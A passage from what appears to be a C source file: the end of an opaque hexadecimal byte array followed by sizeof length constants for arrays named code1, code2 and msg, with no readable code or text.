	0x06, 0x3F, 0x05, 0x80, 0x00, 0x08, 0xBF, 0x08, 0x16, 0x08, 0x1E, 0x05,
	0x8A, 0x08, 0x0A, 0x11, 0x00, 0x04, 0x0F, 0x00, 0x13, 0xE8, 0x08, 0x40,
	0x8F, 0xF7, 0x1D, 0x0F, 0x40, 0x01, 0x09, 0x7F, 0x02, 0x0F, 0x40, 0x01,
	0x06, 0x3D, 0x01, 0x05, 0x09, 0x01, 0x05, 0x08, 0x00, 0x13, 0xA1, 0x08,
	0x16, 0xBF, 0x03, 0x06, 0xFA, 0x08, 0x06, 0xC3, 0x03, 0x12, 0x40, 0x01,
	0x11, 0xC9, 0x1D, 0x0A, 0x11, 0x00, 0x04, 0x0F, 0x00, 0x0F, 0x07, 0x1E,
	0x40, 0x93, 0xF7, 0x1D, 0x11, 0x40, 0x01, 0x08, 0x7F, 0x02, 0x0E, 0x40,
	0x01, 0x81, 0x00, 0x0D, 0x08, 0x7D, 0x02, 0x07, 0xCC, 0x04, 0x08, 0xFE,
	0x0E, 0x23, 0x40, 0x01, 0x05, 0xBC, 0x07, 0x82, 0x0D, 0x01, 0x0D, 0x04,
	0xBC, 0x0D, 0x10, 0x40, 0x01, 0x10, 0xC9, 0x1D, 0x0B, 0x47, 0x1D, 0x80,
	0x0B, 0x05, 0x30, 0x01, 0x0D, 0x07, 0x1E, 0x40, 0x92, 0xF7, 0x1D, 0x10,
	0x40, 0x01, 0x80, 0x1C, 0x07, 0xBD, 0x08, 0x11, 0x40, 0x01, 0x09, 0x88,
	0x08, 0x10, 0x3E, 0x10, 0x20, 0xBF, 0x03, 0x04, 0x23, 0x00, 0x0A, 0x0E,
	0x05, 0x11, 0x40, 0x01, 0x0F, 0xC9, 0x1D, 0x0C, 0xF9, 0x1D, 0x0E, 0x0E,
	0x00, 0x0B, 0x67, 0x15, 0x40, 0x8B, 0xF7, 0x1D, 0x11, 0xC0, 0x17, 0x07,
	0xBD, 0x08, 0x11, 0x52, 0x15, 0x05, 0x28, 0x01, 0x05, 0x43, 0x06, 0x06,
	0x7F, 0x02, 0x0E, 0x7E, 0x11, 0x06, 0x21, 0x01, 0x23, 0x29, 0x06, 0x13,
	0x40, 0x01, 0x18, 0xF9, 0x1D, 0x17, 0x57, 0x1A, 0x40, 0x8E, 0xF7, 0x1D,
	0x10, 0x40, 0x01, 0x80, 0x1B, 0x09, 0xBF, 0x03, 0x11, 0x40, 0x01, 0x05,
	0xCA, 0x09, 0x0A, 0xFC, 0x04, 0x1D, 0x7F, 0x11, 0x2D, 0x40, 0x01, 0x17,
	0x69, 0x11, 0x1E, 0x1E, 0x00, 0x40, 0x87, 0x37, 0x15, 0x10, 0x80, 0x1B,
	0x04, 0x27, 0x03, 0x0A, 0x29, 0x21, 0x0F, 0x40, 0x01, 0x0E, 0x3A, 0x0B,
	0x40, 0x59, 0x40, 0x01, 0x07, 0x62, 0x02, 0x08, 0xEC, 0x1D, 0x40, 0xAC,
	0x40, 0x01, 0x0C, 0xF2, 0x22, 0x0F, 0x40, 0x01, 0x80, 0x0D, 0x08, 0xC7,
	0x04, 0x08, 0x3A, 0x0B, 0x16, 0x40, 0x01, 0x13, 0x3F, 0x06, 0x1F, 0x77,
	0x00, 0x12, 0x29, 0x1F, 0x08, 0x75, 0x25, 0x40, 0xB5, 0x40, 0x01, 0x0A,
	0xC3, 0x1C, 0x0E, 0x40, 0x01, 0x0B, 0x43, 0x02, 0x16, 0x40, 0x01, 0x0B,
	0xBE, 0x12, 0x10, 0x1B, 0x00, 0x80, 0x31, 0x2C, 0x40, 0x01, 0x0B, 0xC7,
	0x01, 0x40, 0xB3, 0x40, 0x01, 0x09, 0x7F, 0x02, 0x07, 0xC3, 0x1C, 0x2A,
	0x40, 0x01, 0x1B, 0xBF, 0x03, 0x11, 0x36, 0x0B, 0x22, 0x80, 0x02, 0x09,
	0xAC, 0x21, 0x1C, 0x97, 0x20, 0x40, 0x93, 0x40, 0x01, 0x82, 0x03, 0x1B,
	0x1C, 0x07, 0xB1, 0x00, 0x06, 0x6C, 0x09, 0x19, 0x40, 0x01, 0x2C, 0xBF,
	0x03, 0x2D, 0x80, 0x02, 0x07, 0x32, 0x01, 0x07, 0xC3, 0x0B, 0x1D, 0x97,
	0x20, 0x40, 0x94, 0x80, 0x02, 0x0F, 0x01, 0x23, 0x14, 0x40, 0x01, 0x1B,
	0x10, 0x37, 0x07, 0x08, 0x41, 0x0F, 0x04, 0x0F, 0x0D, 0x92, 0x39, 0x2E,
	0x80, 0x07, 0x14, 0x07, 0x1E, 0x40, 0x9D, 0x00, 0x05, 0x21, 0x00, 0x28,
	0x10, 0x40, 0x01, 0x0E, 0xCB, 0x12, 0x15, 0x47, 0x0B, 0x3B, 0x40, 0x01,
	0x40, 0xB0, 0x80, 0x02, 0x30, 0x40, 0x01, 0x0F, 0xA5, 0x1C, 0x1C, 0x87,
	0x0C, 0x18, 0x40, 0x01, 0x0C, 0xC9, 0x1D, 0x2B, 0x40, 0x0B, 0x40, 0x8F,
	0x80, 0x0C, 0x16, 0x80, 0x2A, 0x20, 0xA5, 0x00, 0x1E, 0x33, 0x1F, 0x22,
	0x41, 0x01, 0x10, 0xC9, 0x1D, 0x0C, 0x10, 0x00, 0x15, 0xC7, 0x1C, 0x40,
	0x8F, 0xF7, 0x1D, 0x1F, 0x00, 0x2D, 0x14, 0xA5, 0x0F, 0x80, 0x6B, 0x2B,
	0x40, 0x01, 0x04, 0x48, 0x24, 0x28, 0xF7, 0x02, 0x06, 0x79, 0x20, 0x0A,
	0x86, 0x00, 0x16, 0x07, 0x1E, 0x40, 0x97, 0x3F, 0x10, 0x16, 0xBF, 0x30,
	0x15, 0x25, 0x12, 0x09, 0x13, 0x01, 0x80, 0x0C, 0x09, 0x28, 0x2E, 0x0E,
	0x25, 0x24, 0x13, 0x0D, 0x28, 0x19, 0x47, 0x01, 0x10, 0xC9, 0x1D, 0x0B,
	0x86, 0x00, 0x0D, 0x17, 0x1E, 0x40, 0x98, 0xF7, 0x1D, 0x1F, 0x3F, 0x33,
	0x14, 0xA5, 0x14, 0x05, 0x0C, 0x01, 0x04, 0x3C, 0x01, 0x09, 0x96, 0x17,
	0x21, 0x4C, 0x29, 0x07, 0x07, 0x00, 0x13, 0x47, 0x06, 0x1B, 0x3F, 0x15,
	0x17, 0x17, 0x1E, 0x40, 0x96, 0x3F, 0x15, 0x2C, 0xF7, 0x36, 0x82, 0x00,
	0x00, 0x31, 0x0A, 0x14, 0x01, 0x0F, 0x30, 0x01, 0x1C, 0x3F, 0x01, 0x05,
	0x87, 0x02, 0x21, 0xD2, 0x03, 0x40, 0xE2, 0x37, 0x38, 0x80, 0x00, 0x0D,
	0x13, 0x01, 0x12, 0x2F, 0x01, 0x19, 0x3E, 0x01, 0x18, 0x85, 0x02, 0x40,
	0xFD, 0x40, 0x01, 0x17, 0x27, 0x01, 0x17, 0x17, 0x00, 0x41, 0x05, 0x36,
	0x47, 0x41, 0x3D, 0x3D, 0x01, 0x41, 0x3D, 0x3F, 0x01, 0x3A, 0x48, 0x01,
	0x41, 0x13, 0x7D, 0x4D, 0x41, 0x3E, 0x3E, 0x01, 0x27, 0x45, 0x01, 0x41,
	0x01, 0x6F, 0x07, 0x25, 0x25, 0x00, 0x80, 0x0C, 0x08, 0x50, 0x0B, 0x0B,
	0x39, 0x01, 0x41, 0x26, 0x3A, 0x01, 0x4D, 0x1C, 0x79, 0x64, 0x4E, 0x41,
	0x41, 0x0E, 0x4F, 0xF7, 0xF7, 0x0F, 0x88, 0x05, 0x05, 0x05, 0x05, 0x05,
	0x05, 0x00, 0x05, 0x05, 0x18, 0x1F, 0x00, 0x1D, 0x3C, 0x00, 0x16, 0x51,
	0x00, 0x12, 0x12, 0x00, 0x40, 0x86, 0xE8, 0x00, 0x23, 0xD3, 0x00, 0x24,
	0xD0, 0x00, 0x14, 0x06, 0x01, 0x40, 0x4A, 0x40, 0x01, 0x11, 0x16, 0x00,
	0x40, 0x84, 0x3E, 0x01, 0x05, 0x85, 0x00, 0x07, 0x89, 0x00, 0x40, 0x57,
	0x40, 0x01, 0x07, 0xA1, 0x01, 0x07, 0x08, 0x00, 0x08, 0x10, 0x00, 0x07,
	0x0C, 0x00, 0x09, 0x18, 0x00, 0x13, 0x95, 0x00, 0x0D, 0x38, 0x00, 0x11,
	0xA0, 0x00, 0x0A, 0x49, 0x00, 0x08, 0x28, 0x00, 0x0D, 0x92, 0x00, 0x09,
	0xBD, 0x01, 0x0B, 0x70, 0x00, 0x08, 0xED, 0x00, 0x0D, 0x71, 0x00, 0x08,
	0x20, 0x00, 0x06, 0x19, 0x00, 0x12, 0x78, 0x00, 0x0F, 0xB8, 0x00, 0x10,
	0xB0, 0x00, 0x09, 0x0C, 0x00, 0x0B, 0xD9, 0x00, 0x0F, 0x98, 0x00, 0x17,
	0x40, 0x00, 0x2B, 0x80, 0x02, 0x0B, 0xE2, 0x02, 0x0B, 0xEC, 0x00, 0x0A,
	0xD8, 0x00, 0x13, 0x3A, 0x00, 0x0A, 0x28, 0x00, 0x09, 0x40, 0x00, 0x15,
	0x80, 0x02, 0x0C, 0x28, 0x01, 0x14, 0x1D, 0x00, 0x11, 0x48, 0x00, 0x14,
	0xB7, 0x00, 0x04, 0x20, 0x00, 0x07, 0x25, 0x00, 0x0D, 0x30, 0x00, 0x0C,
	0x48, 0x00, 0x0F, 0x20, 0x00, 0x10, 0x80, 0x01, 0x0B, 0xA6, 0x00, 0x0A,
	0xAD, 0x00, 0x0C, 0xF8, 0x00, 0x0C, 0x40, 0x00, 0x26, 0xAF, 0x02, 0x11,
	0xE0, 0x00, 0x09, 0x10, 0x05, 0x08, 0x40, 0x01, 0x0E, 0x80, 0x00, 0x17,
	0x40, 0x01, 0x0B, 0x2A, 0x00, 0x1E, 0x60, 0x00, 0x15, 0x1D, 0x00, 0x13,
	0x40, 0x01, 0x16, 0xA8, 0x05, 0x09, 0xE0, 0x00, 0x0E, 0xD8, 0x02, 0x12,
	0x40, 0x01, 0x13, 0xB1, 0x00, 0x0C, 0xA0, 0x00, 0x09, 0x4D, 0x01, 0x0E,
	0x79, 0x02, 0x11, 0xE0, 0x02, 0x2F, 0x40, 0x01, 0x13, 0xD0, 0x00, 0x0A,
	0x87, 0x00, 0x13, 0x78, 0x03, 0x10, 0x08, 0x02, 0x30, 0x40, 0x01, 0x12,
	0xB0, 0x01, 0x1F, 0x68, 0x01, 0x11, 0x20, 0x02, 0x0F, 0x88, 0x00, 0x14,
	0x20, 0x00, 0x0E, 0x68, 0x02, 0x0F, 0x40, 0x01, 0x16, 0x60, 0x00, 0x2B,
	0x2A, 0x05, 0x1F, 0x80, 0x02, 0x06, 0xEB, 0x02, 0x11, 0xCF, 0x01, 0x17,
	0x80, 0x04, 0x12, 0x29, 0x00, 0x0A, 0x30, 0x03, 0x19, 0xA9, 0x06, 0x11,
	0x88, 0x04, 0x1A, 0x68, 0x01, 0x10, 0x50, 0x05, 0x11, 0xB8, 0x05, 0x11,
	0x40, 0x02, 0x19, 0xC0, 0x03, 0x13, 0xC8, 0x00, 0x10, 0xC0, 0x02, 0x40,
	0x89, 0xFF, 0x06, 0x1F, 0x40, 0x09, 0x6C, 0x79, 0xBE, 0x35, 0x57, 0x04,
	0xBD, 0x4C, 0x0D, 0x25, 0x49, 0x0B, 0xD7, 0x46, 0x32, 0x90, 0x4B, 0x40,
	0xF2, 0x3F, 0x01, 0x08, 0xFD, 0x45, 0x09, 0x96, 0x45, 0x80, 0x1D, 0x1E,
	0x74, 0x45, 0x07, 0x20, 0x00, 0x41, 0x0C, 0x44, 0x01, 0x80, 0x1D, 0x12,
	0x3D, 0x4B, 0x1B, 0x65, 0x02, 0x41, 0x0F, 0x2C, 0x46, 0x80, 0x05, 0x05,
	0x51, 0x02, 0x11, 0x40, 0x01, 0x80, 0x1D, 0x41, 0x26, 0xC0, 0x03, 0x05,
	0x29, 0x01, 0x13, 0x9D, 0x4A, 0x1B, 0x85, 0x02, 0x41, 0x0E, 0x00, 0x05,
	0x80, 0x6C, 0x05, 0x0E, 0x01, 0x80, 0x6D, 0x08, 0x04, 0x05, 0x41, 0x31,
	0x40, 0x01, 0x0C, 0xFE, 0x4B, 0x14, 0x6D, 0x51, 0x17, 0x6D, 0x54, 0x5A,
	0x74, 0x2B, 0x22
};

const size_t code1_len = sizeof(code1);
const size_t code2_len = sizeof(code2);
const size_t msg_len = sizeof(msg);